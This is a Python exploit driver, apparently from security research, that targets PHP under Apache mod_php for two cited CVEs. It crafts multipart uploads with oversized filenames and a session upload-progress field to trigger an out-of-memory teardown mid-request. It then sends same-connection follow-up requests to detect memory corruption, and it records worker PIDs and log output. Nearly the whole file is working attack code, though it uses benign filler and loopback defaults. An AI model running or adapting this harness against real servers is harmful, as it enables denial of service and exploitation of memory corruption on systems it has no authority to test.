#!/usr/bin/env python3
"""modphp_arm.py — mod_php OOM arm + consumer-pair driver (CVE-2026-109618/109619 redo).

Byte-exact multipart grammar mirrors the FPM-validated stock arm of the php2slop
receipts (bound NATIVEOUTPUTEXACT; field()/file_part()/arm_body() identical to
/home/davide/ailocal/php2slop/tool/modules/arm.py and
/tmp/opencode/realapps/side/php2shell/native-output-leak-stock-arm.py):
  field(b"PHPSESSID", sid), field(b"PHP_SESSION_UPLOAD_PROGRESS", b"MMM"),
  20 file parts (max_file_uploads cap), filename b"F"*9 then b"F"*262144,
  terminator --B-- CRLF.  Body ~5.25MB < 8M post_max_size.

How the OOM is reached (FPM receipts diag3/diag4, 8.5.10): the server config
sets a small memory_limit (8M here, php_value under mod_php — verified live via
/info.php).  The multipart machinery + session upload-progress encode (which
buffers each F*262144 filename) overshoots 8M mid-request-startup
(pre-RINIT, pre-app-code) and memory_limit's longjmp tears the request down
inside the machinery: producer = CVE-2026-109618-OOM-corruption shape on
mod_php, no application lever needed (any served .php target).

mod_php departure (worker-H learning, documented): with the default
session.use_only_cookies=1 the PHPSESSID *form* field is not honored, so the
attacker-chosen sid travels via the `Cookie: PHPSESSID=<sid>` header on every
multipart request (form field kept byte-shaped for stock parity; harmless).

Same-worker pinning (prefork): producer + consumers are sent sequentially over
ONE keep-alive TCP connection where surviving — the httpd child that accepted
the connection serves all steps; access.log %P pairs producer/consumer pids.

Recipes: benign payloads only (filenames F*-repetition, content "X"),
loopback-only targets, no addresses, no forged call targets.

Receipts under --outdir: matrix.jsonl (one line per step), summary.json,
errlog/accesslog tails per run.
"""
import argparse
import hashlib
import json
import os
import re
import socket
import ssl  # noqa: F401  (stdlib completeness; connections stay plain HTTP)
import sys
import time

BOUNDARY = b"NATIVEOUTPUTEXACT"      # stock byte-mirror
ARM_FILE_COUNT = 20                  # max_file_uploads cap (stock)
POST_MAX_SIZE = 8 * 1024 * 1024      # measured 8M post_max_size (info.php)
_PART_HEADER_BYTES = 140             # stock sizing estimate
OOM_RE = re.compile(
    r"Allowed memory size of (\d+) bytes exhausted"
    r"(?:\(tried to allocate ([\d]+) bytes\))?"
)

MARKERS = (
    b"Allowed memory", b"Fatal error", b"Warning", b"cannot be changed",
    b"failed to open", b"dangling", b"Session ID is too long", b"upload",
)


def field(name: bytes, value: bytes) -> bytes:
    return (b"--" + BOUNDARY + b"\r\n"
            + b'Content-Disposition: form-data; name="' + name + b'"\r\n\r\n'
            + value + b"\r\n")


def file_part(index: int, filename: bytes) -> bytes:
    return (b"--" + BOUNDARY + b"\r\n"
            + b'Content-Disposition: form-data; name="upload'
            + str(index).encode() + b'"; filename="' + filename + b'"\r\n'
            + b"Content-Type: application/octet-stream\r\n\r\nX\r\n")


def arm_body(sid: bytes, length: int = 262144, parts: int = ARM_FILE_COUNT) -> bytes:
    """Stock shape: PHPSESSID field, UPG=MMM field, <parts> file parts, terminator."""
    if not 1 <= parts <= ARM_FILE_COUNT:
        raise ValueError("file parts bounded 1..20 (max_file_uploads)")
    if parts * (length + _PART_HEADER_BYTES) >= POST_MAX_SIZE:
        raise ValueError("arm body would exceed the 8M post_max_size budget")
    body = field(b"PHPSESSID", sid)
    body += field(b"PHP_SESSION_UPLOAD_PROGRESS", b"MMM")
    for index in range(parts):
        n = 9 if index == 0 else length
        body += file_part(index, b"F" * n)
    return body + b"--" + BOUNDARY + b"--\r\n"


def consumer_body() -> bytes:
    """Small machinery probe (diag3 'R2 same-worker' shape): UPG + one tiny file."""
    return (b'--' + BOUNDARY + b"\r\n"
            + b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"'
            b"\r\n\r\nMMM\r\n"
            b"--" + BOUNDARY + b"\r\n"
            + b'Content-Disposition: form-data; name="f"; filename="x"\r\n'
            b"Content-Type: application/octet-stream\r\n\r\nY\r\n"
            + b"--" + BOUNDARY + b"--\r\n")


def request_bytes(host_header: str, method: str, path: str, body: bytes,
                  cookie_sid: bytes | None, keep_alive: bool,
                  basic_user_length: int = 23) -> bytes:
    auth = "Basic " + base64.b64encode(
        b"U" * basic_user_length + b":").decode() + "\r\n"
    hdrs = (
        method.encode() + b" " + path.encode("ascii") + b" HTTP/1.1\r\n"
        + b"Host: " + host_header.encode("ascii") + b"\r\n"
        + (b"Connection: keep-alive\r\n" if keep_alive else b"Connection: close\r\n")
        + ("Authorization: " + auth).encode()
    )
    if cookie_sid is not None:
        hdrs += b"Cookie: PHPSESSID=" + cookie_sid + b"\r\n"
    hdrs += (b"Content-Type: multipart/form-data; boundary=" + BOUNDARY
             + b"\r\nContent-Length: " + str(len(body)).encode("ascii") + b"\r\n\r\n")
    return hdrs + body


def get_request(host_header: str, path: str) -> bytes:
    return (b"GET " + path.encode("ascii") + b" HTTP/1.1\r\nHost: "
            + host_header.encode("ascii") + b"\r\nConnection: close\r\n\r\n")


def read_line(stream) -> bytes:
    line = stream.readline(65536 + 1)
    if not line or len(line) > 65536:
        raise ValueError("invalid/oversized response line")
    return line


def read_response(stream, timeout: float) -> dict:
    t0 = time.time()
    status = read_line(stream)
    if not status.startswith(b"HTTP/"):
        raise ValueError("no HTTP status line")
    code = int(status.split()[1])
    headers: dict[str, str] = {}
    while True:
        line = read_line(stream)
        if line in (b"\r\n", b"\n", b""):
            break
        if b":" in line:
            k, v = line.split(b":", 1)
            headers[k.decode("latin1").strip().lower()] = v.decode("latin1").strip()
    body = bytearray()
    socket_closed = False
    if "chunked" in headers.get("transfer-encoding", "").lower():
        while True:
            size_line = read_line(stream)
            size = int(size_line.split(b";", 1)[0].strip(), 16)
            if size == 0:
                while True:
                    t = read_line(stream)
                    if t in (b"\r\n", b"\n", b""):
                        break
                break
            block = stream.read(size + 2)
            if not block.endswith(b"\r\n"):
                socket_closed = True
                break
            body.extend(block[:-2])
    elif "content-length" in headers:
        want = int(headers["content-length"])
        while len(body) < want:
            chunk = stream.read(min(want - len(body), 65536))
            if not chunk:
                socket_closed = True
                break
            body.extend(chunk)
    else:
        while True:
            chunk = stream.read(65536)
            if not chunk:
                break
            body.extend(chunk)
        socket_closed = True
    return {
        "status": code,
        "headers": headers,
        "body": bytes(body),
        "socket_closed": socket_closed,
        "wall_ms": round((time.time() - t0) * 1000),
    }


def tail_since(path: str, offset: int) -> bytes:
    try:
        size = os.path.getsize(path)
    except OSError:
        return b""
    if size <= offset:
        return b""
    with open(path, "rb") as fh:
        fh.seek(offset)
        return fh.read(size - offset)


def httpd_children():
    pids = []
    for entry in os.listdir("/proc"):
        if entry.isdigit():
            try:
                with open(f"/proc/{entry}/cmdline", "rb") as fh:
                    cmd = fh.read().replace(b"\x00", b" ")
            except OSError:
                continue
            if b"httpd" in cmd and b"-k start" in cmd:
                pids.append(int(entry))
    return sorted(pids)


import base64


class Client:
    """One keep-alive-capable HTTP connection to the loopback target."""

    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.sock = None
        self.stream = None

    def open(self):
        self.sock = socket.create_connection((self.host, self.port), timeout=15)
        self.sock.settimeout(15)
        self.stream = self.sock.makefile("rb", buffering=0)
        return self

    def send(self, raw: bytes, timeout: float) -> dict:
        try:
            self.sock.sendall(raw)
        except (BrokenPipeError, ConnectionResetError) as exc:
            return {"transport": f"send-failed: {exc!r}", "sent": False}
        self.sock.settimeout(timeout)
        try:
            resp = read_response(self.stream, timeout)
        except (socket.timeout, TimeoutError):
            return {"transport": "read-timeout", "sent": True}
        except (BrokenPipeError, ConnectionResetError, ValueError) as exc:
            return {"transport": f"read-failed: {exc!r}", "sent": True}
        text = resp["body"].decode("utf-8", "replace")
        oom = OOM_RE.search(text)
        resp.update({
            "body_len": len(resp["body"]),
            "body_sha256": hashlib.sha256(resp["body"]).hexdigest()[:16],
            "oom_alloc": oom.group(1) if oom else None,
            "oom_try": oom.group(2) if oom else None,
            "markers": {m.decode(): (m in resp["body"]) for m in MARKERS},
            "body_head": text[:300].replace("\n", " | "),
            "keep_alive": resp["headers"].get("connection", "").lower() != "close",
        })
        return resp

    def close(self):
        for h in (self.stream, self.sock):
            if h:
                try:
                    h.close()
                except OSError:
                    pass
        self.sock = self.stream = None


def step(client: Client, name: str, raw: bytes, timeout: float,
         recs: list, ctx: dict) -> dict:
    err_off = ctx["err_off"]
    acc_off = ctx["acc_off"]
    res = client.send(raw, timeout)
    time.sleep(ctx["gap"])
    err_delta = tail_since(ctx["errlog"], err_off)
    acc_delta = tail_since(ctx["accesslog"], acc_off)
    pid = None
    for ln in reversed([l for l in acc_delta.decode("utf-8", "replace").split("\n")
                        if l.strip()]):
        try:
            pid = int(ln.strip().split()[-1])
            break
        except (ValueError, IndexError):
            continue
    ctx["err_off"] = os.path.getsize(ctx["errlog"]) if os.path.exists(ctx["errlog"]) else err_off
    ctx["acc_off"] = os.path.getsize(ctx["accesslog"]) if os.path.exists(ctx["accesslog"]) else acc_off
    rec = {
        "run": ctx["run"], "table": ctx["table"], "step": name,
        "pid_from_accesslog": pid,
        "worker_alive_after": None if pid is None else (
            os.path.isdir(f"/proc/{pid}")),
        "err_delta": err_delta.decode("utf-8", "replace")[-1200:],
    }
    rec.update({k: v for k, v in res.items() if k != "headers"})
    rec["transport_only"] = ("transport" in res and "status" not in res)
    recs.append(rec)
    line = (f"  {name:26s} status={res.get('status')} len={res.get('body_len')} "
            f"sha={res.get('body_sha256')} pid={pid} "
            f"alive={rec['worker_alive_after']} keep_alive={res.get('keep_alive')} "
            f"oom={res.get('oom_alloc')}/{res.get('oom_try')} "
            f"t={res.get('wall_ms')}ms "
            f"{res.get('transport', '')}")
    print(line)
    if rec.get("err_delta"):
        print(f"    err_delta: {rec['err_delta'].strip()[:300]}")
    if ctx.get("transcripts"):
        with open(os.path.join(ctx["transcripts"],
                               f"r{ctx['run']:02d}_{ctx['table']}_{name}.body"), "wb") as f:
            f.write(res.get("body", b""))
    return rec


def ensure_open(client: Client) -> None:
    """(Re)open the keep-alive connection after a server-side close."""
    if client.sock is None:
        client.open()


def run_battery(args, ctx, recs, host_header: str) -> None:
    """One sequence: baseline probe -> producer(OOM arm) -> consumer x3
    -> post-check, keep-alive-pinned on one connection."""
    client = Client(args.host, args.port).open()
    try:
        step(client, "conn_baseline_probe", request_bytes(
            host_header, "POST", args.target, consumer_body(),
            args.sid.encode(), keep_alive=True), args.tmo_resp, recs, ctx)
        ensure_open(client)
        step(client, "producer_oom_arm", request_bytes(
            host_header, "POST", args.target,
            arm_body(args.sid.encode(), args.filename_length, args.parts),
            args.sid.encode(), keep_alive=True), args.tmo_arm, recs, ctx)
        for i in (1, 2, 3):
            ensure_open(client)
            step(client, f"consumer_probe_{i}", request_bytes(
                host_header, "POST", args.target, consumer_body(),
                args.sid.encode(), keep_alive=True), args.tmo_resp, recs, ctx)
    finally:
        client.close()
    # wedge check + child census on a fresh connection
    wedge = Client(args.host, args.port)
    try:
        wedge.open()
        r = wedge.send(get_request(host_header, "/index.php"), 8)
        wedge.close()
        ctx["wedge"] = r.get("transport", "ok") if "status" not in r else "ok"
    except OSError as exc:
        ctx["wedge"] = f"conn-fail: {exc!r}"
    print(f"  post_check wedge={ctx['wedge']} children_before={ctx['children_before']} "
          f"children_after={httpd_children()}")


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=28850)
    ap.add_argument("--target", default="/sess.php")
    ap.add_argument("--sid", default="abcdefgh")
    ap.add_argument("--filename-length", type=int, default=262144)
    ap.add_argument("--parts", type=int, default=ARM_FILE_COUNT)
    ap.add_argument("--repeat", type=int, default=1)
    ap.add_argument("--no-producer", action="store_true",
                    help="control battery: baseline+consumer only")
    ap.add_argument("--tmo-arm", type=float, default=45.0)
    ap.add_argument("--tmo-resp", type=float, default=15.0)
    ap.add_argument("--gap", type=float, default=1.0)
    ap.add_argument("--errlog", default="/tmp/opencode/modphp_redo_1021/logs/err.log")
    ap.add_argument("--accesslog", default="/tmp/opencode/modphp_redo_1021/access.log")
    ap.add_argument("--outdir", required=True)
    args = ap.parse_args()

    os.makedirs(args.outdir, exist_ok=True)
    transcripts = os.path.join(args.outdir, "transcripts")
    os.makedirs(transcripts, exist_ok=True)
    host_header = (args.host if args.port == 80 else f"{args.host}:{args.port}")

    ctx = {
        "errlog": args.errlog, "accesslog": args.accesslog,
        "gap": args.gap, "err_off": 0, "acc_off": 0,
        "transcripts": transcripts, "run": 0, "table": "control",
        "children_before": None,
    }
    for p in (args.errlog, args.accesslog):
        ctx["err_off" if "err" in os.path.basename(p) else "acc_off"] = (
            os.path.getsize(p) if os.path.exists(p) else 0)

    recs: list = []
    tables = []
    mode = "oompair"
    if args.no_producer:
        mode = "control"

    for ridx in range(1, args.repeat + 1):
        ctx["run"] = ridx
        ctx["table"] = f"{mode}_{args.target.strip('/').replace('/', '_')}"
        ctx["children_before"] = httpd_children()
        print(f"--- run {ridx} ({ctx['table']}) children={ctx['children_before']}")
        if args.no_producer:
            client = Client(args.host, args.port).open()
            try:
                for i in (1, 2, 3):
                    step(client, f"consumer_probe_{i}", request_bytes(
                        host_header, "POST", args.target, consumer_body(),
                        args.sid.encode(), keep_alive=True), args.tmo_resp,
                        recs, ctx)
            finally:
                client.close()
        else:
            run_battery(args, ctx, recs, host_header)
        tables.append(ctx["table"])

    kids = {c: (os.path.isdir(f"/proc/{c}") if c else None)
            for c in httpd_children()}
    summary = {
        "mode": mode, "target": args.target, "sid": args.sid,
        "filename_length": args.filename_length, "parts": args.parts,
        "repeat": args.repeat, "host": args.host, "port": args.port,
        "children": kids,
        "steps": len(recs),
        "producer_steps": [ {k: r[k] for k in ("run","step","status","body_len","body_sha256","oom_alloc","oom_try","pid_from_accesslog","worker_alive_after","transport") if k in r}
                            for r in recs if r["step"].startswith("producer") ],
        "consumer_steps": [ {k: r[k] for k in ("run","step","status","body_len","body_sha256","oom_alloc","pid_from_accesslog","worker_alive_after","markers","transport") if k in r}
                            for r in recs if r["step"].startswith("consumer") or r["step"].startswith("conn_") ],
        "wedge_last": ctx.get("wedge"),
    }
    with open(os.path.join(args.outdir, "matrix.jsonl"), "w") as f:
        for r in recs:
            f.write(json.dumps(r, sort_keys=True, default=str) + "\n")
    with open(os.path.join(args.outdir, "summary.json"), "w") as f:
        json.dump(summary, f, indent=2, sort_keys=True)
    print(json.dumps({"outdir": args.outdir, "children": kids,
                      "wedge": ctx.get("wedge"),
                      "producer": summary["producer_steps"],
                      "consumers": [c.get("body_sha256") for c in summary["consumer_steps"]]}, indent=1))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
